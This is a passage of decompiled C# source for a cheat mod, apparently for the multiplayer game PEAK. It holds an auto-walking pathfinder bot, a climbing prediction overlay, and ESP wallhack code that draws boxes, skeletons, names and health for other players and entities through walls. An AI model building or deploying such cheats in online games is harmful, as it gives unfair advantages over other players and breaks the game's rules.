					CheatConfig.AutoPathfinderEnabled = false;
				}
				else
				{
					targetPosition = val;
					followingPath = true;
					Debug.Log((object)$"[AutoPathfinder] Started pathfinding to campfire at {targetPosition}");
				}
			}
		}

		private static void StopFollowing()
		{
			followingPath = false;
			targetPosition = Vector3.zero;
			pathLine.Clear();
		}

		public static void Update()
		{
			if (!enabled || Character.localCharacter == null)
			{
				if (followingPath)
				{
					StopFollowing();
				}
				return;
			}
			if (Time.time - lastTargetCheck > targetCheckInterval)
			{
				lastTargetCheck = Time.time;
				if (targetPosition == Vector3.zero || Vector3.Distance(Character.localCharacter.Center, targetPosition) < 3f)
				{
					Vector3 val = FindCampfire();
					if (val == Vector3.zero)
					{
						Debug.Log((object)"[AutoPathfinder] Lost campfire - disabling feature");
						enabled = false;
						CheatConfig.AutoPathfinderEnabled = false;
						StopFollowing();
						return;
					}
					targetPosition = val;
				}
			}
			if (followingPath && targetPosition != Vector3.zero)
			{
				WalkTowardsTarget();
				UpdatePathLine();
			}
		}

		private static void WalkTowardsTarget()
		{
			if (Character.localCharacter == null || Character.localCharacter.input == null)
			{
				return;
			}
			Vector3 center = Character.localCharacter.Center;
			Vector3 val = targetPosition;
			float flatDistance = GetFlatDistance(center, val);
			float num = Vector3.Distance(center, val);
			LookAtTarget(val);
			float num2 = 1f;
			if (num < 5f)
			{
				if (flatDistance < 2.5f)
				{
					num2 = 0f;
				}
				else if (flatDistance < 1.5f)
				{
					num2 = -1f;
				}
			}
			Character.localCharacter.input.movementInput = new Vector2(0f, num2);
			if ((Object)(object)Character.localCharacter.refs?.climbing != (Object)null)
			{
				TryClimb(Character.localCharacter.refs.climbing);
			}
			RaycastHit val2 = HelperFunctions.LineCheck(center, center + Vector3.down * 3f, (LayerType)1, 0f, (QueryTriggerInteraction)1);
			if ((Object)(object)(val2).transform == (Object)null)
			{
				Character.localCharacter.input.jumpWasPressed = true;
			}
			if (num > 10f)
			{
				Character.localCharacter.input.sprintIsPressed = true;
				Character.localCharacter.data.isSprinting = true;
			}
			else
			{
				Character.localCharacter.input.sprintIsPressed = false;
				Character.localCharacter.data.isSprinting = false;
			}
		}

		private static void LookAtTarget(Vector3 targetPos)
		{
			if (Character.localCharacter == null)
			{
				return;
			}
			Vector3 val = targetPos - Character.localCharacter.Head;
			try
			{
				Type type = Type.GetType("HelperFunctions");
				if (type != null)
				{
					MethodInfo method = type.GetMethod("DirectionToLook", BindingFlags.Static | BindingFlags.Public | BindingFlags.NonPublic);
					if (method != null)
					{
						object obj = method.Invoke(null, new object[1] { val });
						if (obj is Vector3 val2)
						{
							Character.localCharacter.data.lookValues = new Vector2(val2.x, val2.y);
						}
						else if (obj is Vector2 lookValues)
						{
							Character.localCharacter.data.lookValues = lookValues;
						}
						return;
					}
				}
			}
			catch (Exception ex)
			{
				Debug.LogWarning((object)("[AutoPathfinder] Error calling DirectionToLook: " + ex.Message));
			}
			Vector3 normalized = (val).normalized;
			float num = Mathf.Atan2(normalized.x, normalized.z) * 57.29578f;
			float num2 = (0f - Mathf.Asin(normalized.y)) * 57.29578f;
			Character.localCharacter.data.lookValues = new Vector2(num, num2);
		}

		private static float GetFlatDistance(Vector3 from, Vector3 to)
		{
			try
			{
				Type type = Type.GetType("HelperFunctions");
				if (type != null)
				{
					MethodInfo method = type.GetMethod("FlatDistance", BindingFlags.Static | BindingFlags.Public | BindingFlags.NonPublic);
					if (method != null)
					{
						return (float)method.Invoke(null, new object[2] { from, to });
					}
				}
			}
			catch (Exception ex)
			{
				Debug.LogWarning((object)("[AutoPathfinder] Error calling FlatDistance: " + ex.Message));
			}
			Vector3 val = new Vector3(from.x, 0f, from.z);
			Vector3 val2 = default(Vector3);
			(val2)..ctor(to.x, 0f, to.z);
			return Vector3.Distance(val, val2);
		}

		private static void TryClimb(CharacterClimbing climbing)
		{
			if (climbing == null)
			{
				return;
			}
			try
			{
				MethodInfo method = typeof(CharacterClimbing).GetMethod("TryClimb", BindingFlags.Instance | BindingFlags.Public | BindingFlags.NonPublic);
				if (method != null)
				{
					method.Invoke(climbing, null);
					return;
				}
			}
			catch (Exception ex)
			{
				Debug.LogWarning((object)("[AutoPathfinder] Error calling TryClimb: " + ex.Message));
			}
			try
			{
				MethodInfo[] methods = typeof(CharacterClimbing).GetMethods(BindingFlags.Instance | BindingFlags.Public | BindingFlags.NonPublic);
				foreach (MethodInfo methodInfo in methods)
				{
					if (methodInfo.Name.Contains("Climb") && methodInfo.GetParameters().Length == 0)
					{
						methodInfo.Invoke(climbing, null);
						break;
					}
				}
			}
			catch
			{
			}
		}

		private static void UpdatePathLine()
		{
			if (Character.localCharacter == null || targetPosition == Vector3.zero)
			{
				return;
			}
			pathLine.Clear();
			Vector3 center = Character.localCharacter.Center;
			Vector3 val = targetPosition;
			int num = Mathf.Max(5, Mathf.RoundToInt(Vector3.Distance(center, val) / 5f));
			num = Mathf.Min(num, 50);
			RaycastHit val3 = default(RaycastHit);
			for (int i = 0; i <= num; i++)
			{
				float num2 = (float)i / (float)num;
				Vector3 val2 = Vector3.Lerp(center, val, num2);
				if (Physics.Raycast(val2 + Vector3.up * 10f, Vector3.down, ref val3, 20f))
				{
					val2.y = (val3).point.y + 1f;
				}
				pathLine.Add(val2);
			}
		}

		private static Vector3 FindCampfire()
		{
			if (Character.localCharacter == null)
			{
				return Vector3.zero;
			}
			Vector3 center = Character.localCharacter.Center;
			Vector3 val = Vector3.zero;
			float num = float.MaxValue;
			try
			{
				Type type = Type.GetType("Campfire");
				if (type != null)
				{
					Object[] array = Object.FindObjectsByType(type, FindObjectsSortMode.None);
					foreach (Object obj in array)
					{
						MonoBehaviour val2 = (MonoBehaviour)(object)((obj is MonoBehaviour) ? obj : null);
						if (val2 != null && val2 != null)
						{
							float num2 = Vector3.Distance(center, val2.transform.position);
							if (num2 < num)
							{
								num = num2;
								val = val2.transform.position;
							}
						}
					}
				}
			}
			catch (Exception ex)
			{
				Debug.LogWarning((object)("[AutoPathfinder] Error finding campfires via component: " + ex.Message));
			}
			if (val == Vector3.zero)
			{
				GameObject[] array2 = Object.FindObjectsByType<GameObject>(FindObjectsSortMode.None);
				foreach (GameObject val3 in array2)
				{
					if (val3 == null)
					{
						continue;
					}
					string text = ((Object)val3).name.ToLower();
					if (text.Contains("campfire") || text.Contains("fire") || text.Contains("checkpoint"))
					{
						float num3 = Vector3.Distance(center, val3.transform.position);
						if (num3 < num)
						{
							num = num3;
							val = val3.transform.position;
						}
					}
				}
			}
			return val;
		}

		public static void DrawPath()
		{
			if (enabled && pathLine.Count >= 2 && !(Camera.main == null))
			{
				CheatConfig.ESPMaterial.SetPass(0);
				GL.PushMatrix();
				GL.LoadProjectionMatrix(Camera.main.projectionMatrix);
				GL.modelview = Camera.main.worldToCameraMatrix;
				GL.Begin(1);
				GL.Color(new Color(0f, 1f, 1f, 0.8f));
				for (int i = 0; i < pathLine.Count - 1; i++)
				{
					GL.Vertex(pathLine[i]);
					GL.Vertex(pathLine[i + 1]);
				}
				GL.End();
				GL.PopMatrix();
			}
		}
	}
	public static class ClimbingPrediction
	{
		private static bool enabled = true;

		private static List<Vector3> predictionLine = new List<Vector3>();

		private static Material lineMaterial;

		public static bool Enabled
		{
			get
			{
				return enabled;
			}
			set
			{
				enabled = value;
			}
		}

		public static void SetEnabled(bool value)
		{
			enabled = value;
		}

		public static void Initialize()
		{
			lineMaterial = new Material(Shader.Find("Sprites/Default"));
			lineMaterial.color = new Color(0f, 1f, 0f, 0.8f);
		}

		public static void Update()
		{
			enabled = CheatConfig.ClimbingPredictionEnabled;
			if (!enabled || Character.localCharacter == null)
			{
				return;
			}
			Character localCharacter = Character.localCharacter;
			if (!localCharacter.data.isClimbing && localCharacter.data.currentClimbHandle == null)
			{
				if (Camera.main != null)
				{
					RaycastHit val = default(RaycastHit);
					if (Physics.Raycast(new Ray(Camera.main.transform.position, Camera.main.transform.forward), ref val, 5f))
					{
						if ((Object)(object)((Component)(val).collider).GetComponent<ClimbHandle>() != (Object)null || Vector3.Angle((val).normal, Vector3.up) > 45f)
						{
							CalculatePredictionLine(localCharacter, (val).point, (val).normal);
						}
						else
						{
							predictionLine.Clear();
						}
					}
					else
					{
						predictionLine.Clear();
					}
				}
				else
				{
					predictionLine.Clear();
				}
			}
			else if (localCharacter.data.isClimbing)
			{
				CalculatePredictionLine(localCharacter, localCharacter.data.climbPos, localCharacter.data.climbNormal);
			}
			else
			{
				predictionLine.Clear();
			}
		}

		private static void CalculatePredictionLine(Character character, Vector3 startPos, Vector3 surfaceNormal)
		{
			predictionLine.Clear();
			if (character == null || (Object)(object)character.refs?.climbing == (Object)null)
			{
				return;
			}
			try
			{
				Type type = ((object)character.refs.climbing).GetType();
				FieldInfo field = type.GetField("climbSpeed", BindingFlags.Instance | BindingFlags.Public);
				FieldInfo field2 = type.GetField("climbSpeedMod", BindingFlags.Instance | BindingFlags.Public);
				FieldInfo field3 = type.GetField("maxStaminaUsage", BindingFlags.Instance | BindingFlags.Public);
				FieldInfo field4 = type.GetField("minStaminaUsage", BindingFlags.Instance | BindingFlags.Public);
				FieldInfo field5 = type.GetField("climbingStamMinimumMultiplier", BindingFlags.Instance | BindingFlags.Public);
				float num = ((field != null) ? ((float)field.GetValue(character.refs.climbing)) : 3f);
				if (field2 != null)
				{
					_ = (float)field2.GetValue(character.refs.climbing);
				}
				float num2 = ((field3 != null) ? ((float)field3.GetValue(character.refs.climbing)) : 0.2f);
				float num3 = ((field4 != null) ? ((float)field4.GetValue(character.refs.climbing)) : 0.02f);
				float num4 = ((field5 != null) ? ((float)field5.GetValue(character.refs.climbing)) : 1f);
				float num5 = character.data.currentStamina;
				Vector2 val = ((character.input != null) ? character.input.movementInput : Vector2.zero);
				if (((Vector2)(ref val)).magnitude < 0.1f)
				{
					val = Vector2.up;
				}
				Vector3 val2 = startPos;
				Vector3 val3 = surfaceNormal;
				ClimbModifierSurface val4 = null;
				RaycastHit val5 = default(RaycastHit);
				if (Physics.Raycast(startPos + val3 * 0.5f, -val3, ref val5, 2f))
				{
					val4 = ((Component)(val5).collider).GetComponent<ClimbModifierSurface>();
				}
				Vector3 val6 = Vector3.ProjectOnPlane(Vector3.up, val3);
				Vector3 normalized = (val6).normalized;
				val6 = Vector3.Cross(normalized, val3);
				Vector3 normalized2 = (val6).normalized;
				val6 = normalized * val.y + normalized2 * val.x;
				Vector3 val7 = (val6).normalized;
				if ((val7).magnitude < 0.1f)
				{
					val7 = normalized;
				}
				float num6 = 0.2f;
				float num7 = num6 / num;
				int num8 = 500;
				int num9 = 0;
				predictionLine.Add(val2);
				Type type2 = AppDomain.CurrentDomain.GetAssemblies().SelectMany((Assembly a) => a.GetTypes()).FirstOrDefault((Type t) => t.Name == "HelperFunctions");
				MethodInfo lineCheckMethod = null;
				if (type2 != null)
				{
					lineCheckMethod = type2.GetMethod("LineCheck", BindingFlags.Static | BindingFlags.Public, null, new Type[3]
					{
						typeof(Vector3),
						typeof(Vector3),
						typeof(object)
					}, null);
				}
				while (num5 > 0f && num9 < num8)
				{
					Vector3 samplePos = val2 + val7 * num6;
					RaycastHit val8 = SampleWallAtPosition(samplePos, val3, type2, lineCheckMethod);
					if ((Object)(object)(val8).transform == (Object)null)
					{
						break;
					}
					float num10 = Vector3.Angle((val8).normal, Vector3.up);
					ClimbModifierSurface component = ((Component)(val8).collider).GetComponent<ClimbModifierSurface>();
					if (component != null)
					{
						MethodInfo method = ((object)component).GetType().GetMethod("OverrideClimbAngle", BindingFlags.Instance | BindingFlags.NonPublic);
						if (method != null)
						{
							object obj = method.Invoke(component, new object[2] { character, num10 });
							if (obj != null)
							{
								num10 = (float)obj;
							}
						}
					}
					float num11 = num10 - 90f;
					bool flag = true;
					if (num11 > 0f)
					{
						if (Mathf.Abs(num11) > 80f)
						{
							flag = false;
						}
					}
					else if (Mathf.Abs(num11) > 40f)
					{
						flag = false;
					}
					if (!flag)
					{
						break;
					}
					samplePos = (val8).point;
					val3 = (val8).normal;
					val4 = component;
					float num12 = num2 * Mathf.Clamp(((Vector2)(ref val)).magnitude, 0f, 1f);
					float num13 = num3 * num4;
					num12 = Mathf.Clamp(num12, num13, num2);
					float num14 = 1f;
					if (!(val4 != null) || !val4.staticClimbCost)
					{
						float num15 = Mathf.InverseLerp(40f, 60f, num10);
						num14 = Mathf.Lerp(0.2f, 1f, num15);
					}
					num12 *= num14;
					if (val4 != null)
					{
						FieldInfo field6 = ((object)val4).GetType().GetField("staminaUsageMultiplier", BindingFlags.Instance | BindingFlags.Public);
						if (field6 != null)
						{
							float num16 = (float)field6.GetValue(val4);
							num12 *= num16;
						}
					}
					num12 *= character.data.staminaMod;
					float num17 = num12 * num7;
					if (!(num5 < num17))
					{
						num5 -= num17;
						val6 = Vector3.ProjectOnPlane(Vector3.up, val3);
						normalized = (val6).normalized;
						val6 = Vector3.Cross(normalized, val3);
						normalized2 = (val6).normalized;
						val6 = normalized * val.y + normalized2 * val.x;
						val7 = (val6).normalized;
						if ((val7).magnitude < 0.1f)
						{
							val7 = normalized;
						}
						predictionLine.Add(samplePos);
						val2 = samplePos;
						num9++;
						continue;
					}
					break;
				}
			}
			catch (Exception ex)
			{
				Debug.LogWarning((object)("[ClimbingPrediction] Error calculating prediction: " + ex.Message));
				predictionLine.Clear();
			}
		}

		private static RaycastHit SampleWallAtPosition(Vector3 samplePos, Vector3 currentNormal, Type helperFunctionsType, MethodInfo lineCheckMethod)
		{
			RaycastHit result = default(RaycastHit);
			Vector3 val = samplePos + currentNormal * 0.4f;
			Vector3 val2 = samplePos + currentNormal * 0.5f;
			Vector3 val3 = samplePos + currentNormal * -1f;
			if (lineCheckMethod != null && helperFunctionsType != null)
			{
				try
				{
					Type nestedType = helperFunctionsType.GetNestedType("LayerType");
					if (nestedType != null)
					{
						object obj = Enum.GetValues(nestedType).Cast<object>().FirstOrDefault((object v) => v.ToString() == "TerrainMap");
						if (obj != null)
						{
							object obj2 = lineCheckMethod.Invoke(null, new object[3] { val, val2, obj });
							if (obj2 != null)
							{
								result = (RaycastHit)obj2;
								if ((Object)(object)(result).transform != (Object)null)
								{
									return result;
								}
							}
							obj2 = lineCheckMethod.Invoke(null, new object[3] { val, val3, obj });
							if (obj2 != null)
							{
								result = (RaycastHit)obj2;
								if ((Object)(object)(result).transform != (Object)null)
								{
									return result;
								}
							}
						}
					}
				}
				catch
				{
				}
			}
			if ((Object)(object)(result).transform == (Object)null)
			{
				Vector3 val4 = val2 - val;
				if (Physics.Raycast(val, (val4).normalized, ref result, 2f))
				{
					return result;
				}
				val4 = val3 - val;
				Physics.Raycast(val, (val4).normalized, ref result, 2f);
				return result;
			}
			return result;
		}

		public static void Draw()
		{
			if (enabled && predictionLine.Count >= 2 && !(Camera.main == null))
			{
				if (lineMaterial == null)
				{
					Initialize();
				}
				CheatConfig.ESPMaterial.SetPass(0);
				GL.PushMatrix();
				GL.LoadProjectionMatrix(Camera.main.projectionMatrix);
				GL.modelview = Camera.main.worldToCameraMatrix;
				GL.Begin(1);
				GL.Color(new Color(0f, 1f, 0f, 0.8f));
				for (int i = 0; i < predictionLine.Count - 1; i++)
				{
					GL.Vertex(predictionLine[i]);
					GL.Vertex(predictionLine[i + 1]);
				}
				GL.End();
				GL.PopMatrix();
			}
		}
	}
	public class ChamsRenderer : MonoBehaviour
	{
		private void OnPostRender()
		{
			ESP.RenderChamsPostRender();
		}
	}
	public static class ESP
	{
		private class EnvironmentalEventInfo
		{
			public string EventType;

			public float NextEventTime;

			public Color Color;
		}

		private static readonly string WATERMARK_TEXT = "protonn - PEAK";

		private static readonly string WATERMARK_CHECK = "protonn - PEAK";

		private static readonly int WATERMARK_HASH = WATERMARK_TEXT.GetHashCode();

		private static GUIStyle _textStyle;

		private static GUIStyle _outlineStyle;

		private static Texture2D _whiteTexture;

		private static Material _lineMaterial;

		private static Material _chamsMaterial;

		private static List<Item> _cachedItems = new List<Item>();

		private static List<GameObject> _cachedLuggage = new List<GameObject>();

		private static List<GameObject> _cachedEntities = new List<GameObject>();

		private static List<GameObject> _cachedSporeShrooms = new List<GameObject>();

		private static List<GameObject> _cachedEnvironmentalEvents = new List<GameObject>();

		private static List<GameObject> _cachedObjects = new List<GameObject>();

		private static HashSet<GameObject> _checkedGameObjects = new HashSet<GameObject>();

		private static bool _initialCacheComplete = false;

		private static float _itemCacheTime = 0f;

		private static float _luggageCacheTime = 0f;

		private static float _entityCacheTime = 0f;

		private static float _sporeShroomCacheTime = 0f;

		private static float _environmentalCacheTime = 0f;

		private static float _objectCacheTime = 0f;

		private static int _frameCounter = 0;

		private static List<Character> _cachedTargets = new List<Character>();

		private static float _targetsCacheTime = 0f;

		private const float TARGETS_CACHE_INTERVAL = 2f;

		private const float CACHE_UPDATE_INTERVAL = 20f;

		private const float MAX_RENDER_DISTANCE = 50f;

		private const int MAX_SKELETONS_PER_FRAME = 2;

		private const int MAX_BOXES_PER_FRAME = 3;

		private const int MAX_ENTITIES_PER_FRAME = 3;

		private const int RENDER_SKIP_FRAMES = 2;

		private static Type _luggageComponentType = null;

		private static WindChillZone _cachedWindZone = null;

		private static float _windZoneCacheTime = 0f;

		private static Object[] _cachedStormVisuals = null;

		private static float _stormVisualsCacheTime = 0f;

		private static Type _stormVisualType = null;

		private static FieldInfo _untilSwitchField = null;

		private static FieldInfo _windActiveField = null;

		private static FieldInfo _stormTypeField = null;

		private static Type _lavaRisingType = null;

		private static Object _cachedLavaRising = null;

		private static float _lavaRisingCacheTime = 0f;

		private static FieldInfo _timeTraveledField = null;

		private static FieldInfo _travelTimeField = null;

		private static FieldInfo _startedField = null;

		private static FieldInfo _endedField = null;

		private static PropertyInfo _timeTraveledProp = null;

		private static PropertyInfo _travelTimeProp = null;

		private static PropertyInfo _startedProp = null;

		private static PropertyInfo _endedProp = null;

		private const float WEATHER_CACHE_UPDATE_INTERVAL = 1f;

		private static readonly Color PlayerColor = new Color(0.2f, 0.8f, 1f);

		private static readonly Color ZombieColor = new Color(1f, 0.2f, 0.2f);

		private static readonly Color ScoutmasterColor = new Color(1f, 0.6f, 0f);

		private static readonly Color BeetleColor = new Color(0.6f, 0.3f, 0.1f);

		private static readonly Color ItemColor = new Color(0.8f, 0.8f, 0.2f);

		private static readonly Color LuggageColor = new Color(1f, 0.84f, 0f);

		private static ChamsRenderer _chamsRenderer = null;

		private static float _fpsUpdateInterval = 0.5f;

		private static float _fpsAccumulator = 0f;

		private static int _fpsFrames = 0;

		private static float _fpsTimeLeft = 0f;

		private static int _currentFPS = 0;

		private static void InitializeStyles()
		{
			if (_textStyle == null)
			{
				_textStyle = new GUIStyle();
				_textStyle.fontSize = 12;
				_textStyle.fontStyle = FontStyle.Bold;
				_textStyle.alignment = TextAnchor.MiddleCenter;
				_textStyle.normal.textColor = Color.white;
			}
			if (_outlineStyle == null)
			{
				_outlineStyle = new GUIStyle(_textStyle);
				_outlineStyle.normal.textColor = Color.black;
			}
			if (_whiteTexture == null)
			{
				_whiteTexture = new Texture2D(1, 1);
				_whiteTexture.SetPixel(0, 0, Color.white);
				_whiteTexture.Apply();
			}
			if (_lineMaterial == null)
			{
				_lineMaterial = new Material(Shader.Find("Hidden/Internal-Colored"));
				((Object)_lineMaterial).hideFlags = HideFlags.HideAndDontSave;
				_lineMaterial.SetInt("_SrcBlend", 5);
				_lineMaterial.SetInt("_DstBlend", 10);
				_lineMaterial.SetInt("_Cull", 0);
				_lineMaterial.SetInt("_ZWrite", 0);
			}
			if (!(_chamsMaterial == null))
			{
				return;
			}
			Shader val = Shader.Find("Unlit/Color");
			if (val == null)
			{
				val = Shader.Find("Hidden/Internal-Colored");
			}
			if (val == null)
			{
				val = Shader.Find("Standard");
			}
			_chamsMaterial = new Material(val);
			((Object)_chamsMaterial).hideFlags = HideFlags.HideAndDontSave;
			_chamsMaterial.renderQueue = 5000;
			try
			{
				if (_chamsMaterial.HasProperty("_ZWrite"))
				{
					_chamsMaterial.SetInt("_ZWrite", 0);
				}
				if (_chamsMaterial.HasProperty("_ZTest"))
				{
					_chamsMaterial.SetInt("_ZTest", 8);
				}
				if (_chamsMaterial.HasProperty("_SrcBlend"))
				{
					_chamsMaterial.SetInt("_SrcBlend", 5);
				}
				if (_chamsMaterial.HasProperty("_DstBlend"))
				{
					_chamsMaterial.SetInt("_DstBlend", 10);
				}
				if (_chamsMaterial.HasProperty("_Cull"))
				{
					_chamsMaterial.SetInt("_Cull", 0);
				}
				if (_chamsMaterial.HasProperty("_Glossiness"))
				{
					_chamsMaterial.SetFloat("_Glossiness", 0f);
				}
				if (_chamsMaterial.HasProperty("_Metallic"))
				{
					_chamsMaterial.SetFloat("_Metallic", 0f);
				}
			}
			catch
			{
			}
		}

		private static Vector3 GetLocalPlayerPosition(Vector3 fallbackPos)
		{
			if (Character.localCharacter != null && (Object)(object)Character.localCharacter.photonView != (Object)null && Character.localCharacter.photonView.IsMine && Character.localCharacter.player != null)
			{
				return Character.localCharacter.Center;
			}
			if (Character.AllCharacters != null)
			{
				foreach (Character allCharacter in Character.AllCharacters)
				{
					if (allCharacter != null && (Object)(object)allCharacter.photonView != (Object)null && allCharacter.photonView.IsMine && allCharacter.player != null)
					{
						return allCharacter.Center;
					}
				}
			}
			return fallbackPos;
		}

		public static void ResetCaches()
		{
			_cachedItems.Clear();
			_cachedLuggage.Clear();
			_cachedEntities.Clear();
			_cachedSporeShrooms.Clear();
			_cachedEnvironmentalEvents.Clear();
			_cachedObjects.Clear();
			_cachedTargets.Clear();
			_checkedGameObjects.Clear();
			_initialCacheComplete = false;
			_itemCacheTime = 0f;
			_luggageCacheTime = 0f;
			_entityCacheTime = 0f;
			_sporeShroomCacheTime = 0f;
			_environmentalCacheTime = 0f;
			_targetsCacheTime = 0f;
			Debug.Log((object)"[ESP] Caches reset - ready for new level");
		}

		public static void RenderAll()
		{
			try
			{
				if (!(Camera.main == null))
				{
					_frameCounter++;
					if (_frameCounter % 2 == 0)
					{
						InitializeStyles();
						InitializeChamsRenderer();
						Vector3 position = Camera.main.transform.position;
						Vector3 localPlayerPosition = GetLocalPlayerPosition(position);
						UpdateCaches(position);
						RenderWithGL(position, localPlayerPosition);
						RenderTextOverlays(localPlayerPosition);
					}
				}
			}
			catch (Exception ex)
			{
				Debug.LogError((object)("[ESP] Error in RenderAll: " + ex.Message));
			}
		}

		private static void RenderWithGL(Vector3 cameraPos, Vector3 localPlayerPos)
		{
			try
			{
				if (!(Camera.main == null) && !(_lineMaterial == null))
				{
					_lineMaterial.SetPass(0);
					GL.PushMatrix();
					GL.LoadProjectionMatrix(Camera.main.projectionMatrix);
					GL.modelview = Camera.main.worldToCameraMatrix;
					GL.Begin(1);
					if (CheatConfig.PlayerBoxESP || CheatConfig.PlayerSkeletonESP)
					{
						RenderPlayersGL(cameraPos, localPlayerPos);
					}
					if (CheatConfig.EntityBoxESP || CheatConfig.EntitySkeletonESP)
					{
						RenderEntitiesGL(cameraPos, localPlayerPos);
					}
					if (CheatConfig.ItemBoxESP)
					{
						RenderItemsGL(cameraPos, localPlayerPos);
					}
					if (CheatConfig.LuggageBoxESP)
					{
						RenderLuggageGL(cameraPos, localPlayerPos);
					}
					if (CheatConfig.SporeShroomESP)
					{
						RenderSporeShroomsGL(cameraPos, localPlayerPos);
					}
					GL.End();
					GL.PopMatrix();
				}
			}
			catch (Exception ex)
			{
				Debug.LogError((object)("[ESP] Error in RenderWithGL: " + ex.Message));
				try
				{
					GL.End();
					GL.PopMatrix();
				}
				catch
				{
				}
			}
		}

		public static void InitializeChamsRenderer()
		{
			if (!(_chamsRenderer != null) && !(Camera.main == null))
			{
				_chamsRenderer = ((Component)Camera.main).GetComponent<ChamsRenderer>();
				if (_chamsRenderer == null)
				{
					_chamsRenderer = Camera.main.gameObject.AddComponent<ChamsRenderer>();
				}
			}
		}

		public static void RenderChamsPostRender()
		{
		}

		public static void RenderChams()
		{
			InitializeChamsRenderer();
		}

		private static void RenderTextOverlays(Vector3 localPlayerPos)
		{
			if (CheatConfig.PlayerNameESP || CheatConfig.PlayerDistanceESP || CheatConfig.PlayerHealthESP)
			{
				RenderPlayersText(localPlayerPos);
			}
			if (CheatConfig.EntityNameESP || CheatConfig.EntityDistanceESP || CheatConfig.EntityAIStateESP)
			{
				RenderEntitiesText(localPlayerPos);
			}
			if (CheatConfig.ItemNameESP || CheatConfig.ItemDistanceESP)
			{
				RenderItemsText(localPlayerPos);
			}
			if (CheatConfig.LuggageNameESP || CheatConfig.LuggageDistanceESP)
			{
				RenderLuggageText(localPlayerPos);
			}
			if (CheatConfig.EnvironmentalESP)
			{
				RenderWeatherTimer();
			}
			if (CheatConfig.ObjectNameESP)
			{
				RenderObjectNames(localPlayerPos);
			}
		}

		private static void UpdateCaches(Vector3 cameraPos)
		{
			float time = Time.time;
			if (!_initialCacheComplete)
			{
				UpdateItemCache(cameraPos);
				UpdateLuggageCache(cameraPos);
				UpdateSporeShroomCache(cameraPos);
				UpdateEntityCache(cameraPos);
				UpdateEnvironmentalCache(cameraPos);
				_initialCacheComplete = true;
				_itemCacheTime = time;
				_luggageCacheTime = time;
				_sporeShroomCacheTime = time;
				_entityCacheTime = time;
				_environmentalCacheTime = time;
				return;
			}
			if (time - _itemCacheTime > 1f)
			{
				UpdateItemCache(cameraPos);
				_itemCacheTime = time;
			}
			if (time - _luggageCacheTime > 2f)
			{
				UpdateLuggageCache(cameraPos);
				_luggageCacheTime = time;
			}
			if (time - _sporeShroomCacheTime > 2f)
			{
				UpdateSporeShroomCache(cameraPos);
				_sporeShroomCacheTime = time;
			}
			if (time - _entityCacheTime > 2f)
			{
				UpdateEntityCache(cameraPos);
				_entityCacheTime = time;
			}
			if (time - _environmentalCacheTime > 20f)
			{
				UpdateEnvironmentalCache(cameraPos);
				_environmentalCacheTime = time;
			}
		}

		private static void UpdateItemCache(Vector3 cameraPos)
		{
			Vector3 localPlayerPosition = GetLocalPlayerPosition(cameraPos);
			_cachedItems.RemoveAll((Item item) => item == null || (Object)(object)item.gameObject == (Object)null);
			Item[] array = Object.FindObjectsByType<Item>(FindObjectsSortMode.None);
			HashSet<Item> currentItemsInRange = new HashSet<Item>();
			Item[] array2 = array;
			foreach (Item val in array2)
			{
				if (!(val == null) && !((Object)(object)val.gameObject == (Object)null) && Vector3.Distance(localPlayerPosition, val.transform.position) <= CheatConfig.ItemESPMaxDistance)
				{
					currentItemsInRange.Add(val);
					if (!_cachedItems.Contains(val))
					{
						_cachedItems.Add(val);
					}
				}
			}
			_cachedItems.RemoveAll((Item item) => item == null || !currentItemsInRange.Contains(item));
		}

		private static void UpdateLuggageCache(Vector3 cameraPos)
		{
			_cachedLuggage.RemoveAll((GameObject luggage) => luggage == null);
			Vector3 localPlayerPosition = GetLocalPlayerPosition(cameraPos);
			if (_luggageComponentType == null)
			{
				try
				{
					string[] array = new string[6] { "Luggage", "Container", "Storage", "Chest", "Suitcase", "Bag" };
					foreach (string typeName in array)
					{
						Type type = AppDomain.CurrentDomain.GetAssemblies().SelectMany((Assembly a) => a.GetTypes()).FirstOrDefault((Type t) => t.Name == typeName && typeof(MonoBehaviour).IsAssignableFrom(t));
						if (type != null)
						{
							_luggageComponentType = type;
							break;
						}
					}
				}
				catch
				{
				}
			}
			HashSet<GameObject> currentLuggageInRange = new HashSet<GameObject>();
			if (_luggageComponentType != null && Object.FindObjectsByType(_luggageComponentType, FindObjectsSortMode.None) is MonoBehaviour[] array2)
			{
				MonoBehaviour[] array3 = array2;
				foreach (MonoBehaviour val in array3)
				{
					if (!(val == null) && !((Object)(object)val.gameObject == (Object)null) && Vector3.Distance(localPlayerPosition, val.transform.position) <= CheatConfig.LuggageESPMaxDistance)
					{
						currentLuggageInRange.Add(val.gameObject);
						if (!_cachedLuggage.Contains(val.gameObject))
						{
							_cachedLuggage.Add(val.gameObject);
						}
					}
				}
			}
			PhotonView[] array4 = Object.FindObjectsByType<PhotonView>(FindObjectsSortMode.None);
			foreach (PhotonView val2 in array4)
			{
				if (val2 == null || (Object)(object)val2.gameObject == (Object)null)
				{
					continue;
				}
				string text = ((Object)val2.gameObject).name.ToLower();
				if ((text.Contains("luggage") || text.Contains("suitcase") || text.Contains("chest") || text.Contains("container") || text.Contains("bag") || text.Contains("case")) && !currentLuggageInRange.Contains(val2.gameObject) && Vector3.Distance(localPlayerPosition, val2.transform.position) <= CheatConfig.LuggageESPMaxDistance)
				{
					currentLuggageInRange.Add(val2.gameObject);
					if (!_cachedLuggage.Contains(val2.gameObject))
					{
						_cachedLuggage.Add(val2.gameObject);
					}
				}
			}
			_cachedLuggage.RemoveAll((GameObject luggage) => luggage == null || !currentLuggageInRange.Contains(luggage));
		}

		private static void UpdateEntityCache(Vector3 cameraPos)
		{
			_cachedEntities.RemoveAll((GameObject entity) => entity == null);
			GetLocalPlayerPosition(cameraPos);
			try
			{
				Character[] array = Object.FindObjectsByType<Character>(FindObjectsSortMode.None);
				int num = 0;
				Character[] array2 = array;
				foreach (Character val in array2)
				{
					if (val == null || (Object)(object)val.gameObject == (Object)null || (Object)(object)val == (Object)(object)Character.localCharacter || (_initialCacheComplete && _checkedGameObjects.Contains(val.gameObject) && !_cachedEntities.Contains(val.gameObject)))
					{
						continue;
					}
					bool flag = false;
					bool flag2 = false;
					try
					{
						FieldInfo field = typeof(Character).GetField("isZombie", BindingFlags.Instance | BindingFlags.Public);
						FieldInfo field2 = typeof(Character).GetField("isScoutmaster", BindingFlags.Instance | BindingFlags.Public);
						FieldInfo field3 = typeof(Character).GetField("isBot", BindingFlags.Instance | BindingFlags.Public);
						if (field != null && (bool)field.GetValue(val))
						{
							flag = true;
						}
						if (field2 != null && (bool)field2.GetValue(val))
						{
							flag = true;
						}
						if (field3 != null && (bool)field3.GetValue(val))
						{
							flag = true;
